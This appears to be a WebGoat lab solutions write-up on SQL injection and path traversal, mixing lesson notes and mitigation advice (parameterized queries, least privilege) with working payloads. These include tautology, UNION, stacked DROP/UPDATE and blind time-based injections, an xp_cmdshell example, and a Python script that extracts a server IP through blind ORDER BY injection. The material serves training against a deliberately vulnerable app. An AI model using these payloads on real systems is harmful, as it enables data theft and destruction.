<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

- [A1 - Injection](#a1---injection)
  - [SQL Injection (intro)](#sql-injection-intro)
  - [SQL Injection (advanced)](#sql-injection-advanced)
  - [SQL Injection (mitigation)](#sql-injection-mitigation)
  - [Path Traversal](#path-traversal)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# A1 - Injection

## SQL Injection (intro)

### 1. Concept

### 2. What is SQL?

### 3. Data Manipulation Language (DML)

- SELECT
- INSERT
- UPDATE
- DELETE

### 4. Data Definition Language (DDL)

- CREATE
- ALTER
- DROP

### 5. Data Control Language (DCL)

- GRANT
- REVOKE

### 6. What is SQL injection?

Vulnerable code:

```sql
SELECT * FROM users WHERE name = '" + userName + "'
```

Exploits:

- `Smith’ OR '1' = '1`
- `Smith’ OR 1 = 1; --`
- `Smith’; DROP TABLE users; TRUNCATE audit_log; --`

### 7. Consequences of SQL Injection

### 8. Severity of SQL Injection

Only these databases support command chaining:

- Microsoft Access
- MySQL Connector/J and C
- Oracle

Not all databases are equal:

- Command shell: `master.dbo.xp_cmdshell 'cmd.exe dir c:'`
- Registry commands: `xp_regread`, `xp_regdeletekey`, ...

### 9. String SQL Injection

Vulnerable Code:

```sql
SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'
```

Exploit:

```sql
Smith' or '1' = '1
```

### 10. Numeric SQL Injection

Vulnerable Code:

```sql
SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = " + User_ID
```

Exploit:

```sql
login_count: 1
userid: 1 or 1 = 1
```

### 11. Compromising confidentiality with String SQL Injection

Vulnerable Code:

```sql
"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';
```

Exploit:

```sql
last_name: Smith
auth_tan: 1' or 1='1
```

### 12. Compromising Integrity with Query chaining

Exploit:

```sql
last_name: Smith
auth_tan: 3SL99A'; UPDATE employees set salary=100000 where auth_tan='3SL99A
```

### 13. Compromising Availability

Exploit:

```sql
'; drop table access_log
```

## SQL Injection (advanced)

### 1. Concept

### 2. Special Characters

```sql
/* */ 	 are inline comments
-- , # 	 are line comments
```

Example: SELECT * FROM users WHERE name = 'admin' --AND pass = 'pass'

```sql
;        allows query chaining
```

Example: SELECT * FROM users; DROP TABLE users;

```sql
', +, ||	allows string concatenation
Char()		strings without quotes
```

Example: SELECT * FROM users WHERE name = '+char(27) OR 1=1

### Special Statements

- UNION
- JOIN

### 3. Try It! Pulling data from other tables

```sql
CREATE TABLE user_data (
	userid int not null,
    first_name varchar(20),
    last_name varchar(20),
    cc_number varchar(30),
    cc_type varchar(10),
    cookie varchar(20),
    login_count int
    );
```

```sql
CREATE TABLE user_system_data (
	userid int not null primary key,
	user_name varchar(12),
	password varchar(10),
	cookie varchar(30)
	);
```

Exploit by appending SQL statement:

```sql
name: '; SELECT * FROM user_system_data where 1='1
```

Exploit by UNION:

```sql
' UNION SELECT userid,user_name,password,cookie,cookie,cookie,userid from user_system_data where 1='1
```

### 4. Blind SQL injection

`https://my-shop.com?article=4`

```sql
SELECT * FROM articles WHERE article_id = 4
```

`https://my-shop.com?article=4 AND 1=1`

```sql
SELECT * FROM articles WHERE article_id = 4 AND 1=1
```

If the response is the same as the first request, the web app is vulnerable to blind SQL injection.

`https://my-shop.com?article=4 AND 1=2`

Previous request will return nothing, as the query returns false.

```sql
https://shop.example.com?article=4 AND substring(database_version(),1,1) = 2
```

A time-based SQL injection is another example of blind SQL injection, which can be used when you get no difference with previous techniques.

```sql
article = 4; sleep(10) --
```

### 5.

Exploit:

```sql
TODO
```

## SQL Injection (mitigation)

### 1. Immutable Queries

- static queries
- parameterized queries
- stored procedures (only if they do not generate dynamic SQL)

### 2. Stored Procedures

Safe:

```sql
CREATE PROCEDURE ListCustomers(@Country nvarchar(30)) AS
SELECT city, COUNT(*)
FROM customers
WHERE country LIKE @Country GROUP BY city

EXEC ListCustomers ‘USA’
```

Injectable:

```sql
CREATE PROCEDURE getUser(@lastName nvarchar(25)) AS
	declare @sql nvarchar(255)
	set @sql = 'SELECT * FROM users WHERE
	            lastname = + @LastName + '
	exec sp_executesql @sql
```

### 3. Parameterized Queries - Java Snippet

### 4. Parameterized Queries - Java Example

### 5. Writing safe code

```java
Connection connection = DriverManager.getConnection(DBURL, DBUSER, DBPWD);
PreparedStatement preparedStatement = connection.prepareStatement("SELECT status FROM users WHERE name=? AND email=?");
preparedStatement.setString(1, name);
preparedStatement.setString(2, email);
```

### 6. Writing safe code

```java
try{
    String name = "foo";
    Connection connection = DriverManager.getConnection(DBURL, DBUSER, DBPW);
    PreparedStatement preparedStatement = connection.prepareStatement("SELECT * FROM users WHERE name=?");
    preparedStatement.setString(1, name);
    preparedStatement.executeQuery();
    
} catch (Exception e){
    System.out.println(e);
}
```

### 7. Parameterized Queries - .NET

### 8. Is Input Validation Required?

Yes, it prevents other types of attacks from being stored in the database.

### 9. Input validation alone is not enough!!

Vulnerable Code: filters only white spaces, no parameterized queries implemented

Exploit:

```sql
name: '/**/or/**/1='1
```

### 10. Input validation alone is not enough!!

Vulnerable Code: performs some input validation, no parameterized queries implemented

Exploit:

```sql
name: '/**/or/**/1='1
```

### 11. Order by clause

```sql
SELECT ...
FROM tableList
[WHERE Expression]
[ORDER BY orderExpression [, ...]]

orderExpression:
{ columnNr | columnAlias | selectExpression }
    [ASC | DESC]

selectExpression:
{ Expression | COUNT(*) | {
    COUNT | MIN | MAX | SUM | AVG | SOME | EVERY |
    VAR_POP | VAR_SAMP | STDDEV_POP | STDDEV_SAMP
} ([ALL | DISTINCT][2]] Expression) } [[AS] label]

Based on HSQLDB
```

`orderExpression` can be a `selectExpression` which can be a function.

```sql
SELECT * FROM users ORDER BY (CASE WHEN (TRUE) THEN lastname ELSE firstname END)
```

We can subsitute any king of boolean operation in the `when()` part.

Implement a white list for values acceptable in the `order by` statement.

### 12.

Find the IP address of `webgoat-prd` (`xxx.130.219.202`).

Default request:

`GET http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=foo HTTP/1.1`

Altered request in order to reveal database query:

```
GET http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=notExistingColumn HTTP/1.1
...
```

Response:

```
...
"message" : "Request processing failed; nested exception is java.sql.SQLSyntaxErrorException: user lacks privilege or object not found: NOTEXISTINGCOLUMN in statement [select id, hostname, ip, mac, status, description from servers  where status <> 'out of order' order by notExistingColumn]"
...
```

Request for result ordered by id:

```
GET http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when+true+then+id+else+ip+end HTTP/1.1
...
```

Request for result ordered by ip:

```
GET http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when+false+then+id+else+ip+end HTTP/1.1
...
```

SQL query for single character exfiltration:

```sql
case when((select top 1 substring(ip,0,1) from servers where hostname='webgoat-prd')='1') then id else ip end
```

Corresponding request:

```
GET http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when%28%28select+top+1+substring%28ip%2C0%2C1%29+from+servers+where+hostname%3D%27webgoat-prd%27%29%3D%271%27%29+then+id+else+ip+end HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: https://localhost:8080/WebGoat/start.mvc
Cookie: JSESSIONID=qjZFwF4-8_OXx2dQEyvs_ar0UCw4tbZBn2kqxsk6
Content-Length: 0
Host: localhost:8080
```

Exploit:

```python
#!/usr/bin/python3

import requests
import json

url = "http://localhost:8080/WebGoat/SqlInjectionMitigations/servers"
headers = {"Cookie":"JSESSIONID=qjZFwF4-8_OXx2dQEyvs_ar0UCw4tbZBn2kqxsk6" }

for position in range(16):
	for digit in {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "."}:
		params = {"column":"case when((select top 1 substring(ip,{},1) from servers where hostname='webgoat-prd')='{}') then id else ip end".format(position,digit)}

		response = requests.get(url, headers=headers, params=params)
		
		json_response = json.loads(response.text)
		
		if json_response[0]["id"] == '1':
			print(digit)
```

Output:

```
1
0
4
.
1
3
0
.
2
1
9
.
2
0
2
```

### 13. Least Privilege

- Connect with a minimum set of privileges
- Database accounts should limit schema access
- Define database accounts for read and read/write access
- Multiple connection pools based on access

## Path Traversal

### 1. Path Traversal

`../` or `%2e%2e%2f`

### 2. Path traversal while uploading files

Exploit:

Full Name: `../test`

### 3. Path traversal while uploading files

TODO